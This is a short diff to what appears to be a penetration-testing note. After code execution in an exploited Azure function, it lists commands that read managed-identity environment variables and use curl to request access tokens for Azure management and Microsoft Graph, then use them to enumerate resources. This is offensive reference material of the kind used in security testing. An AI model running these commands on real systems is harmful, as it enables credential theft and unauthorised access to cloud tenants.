@@ -11,8 +11,8 @@ Use code execution in an exploited function to check if it has a managed identit
 
 ~~~ bash
 env | grep IDENTITY
-curl -sSf $IDENTITY_ENDPOINT -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" -G -d api-version=2019-08-01 -d resource=https://management.azure.com
-curl -sSf $IDENTITY_ENDPOINT -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" -G -d api-version=2019-08-01 -d resource=https://graph.microsoft.com
+curl -sSf "$IDENTITY_ENDPOINT" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" -G -d api-version=2019-08-01 -d resource=https://management.azure.com
+curl -sSf "$IDENTITY_ENDPOINT" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" -G -d api-version=2019-08-01 -d resource=https://graph.microsoft.com
 ~~~
 
 With this access tokens you can enumerate [[notes/azure/index]] resources and [[notes/m365/index]] access.
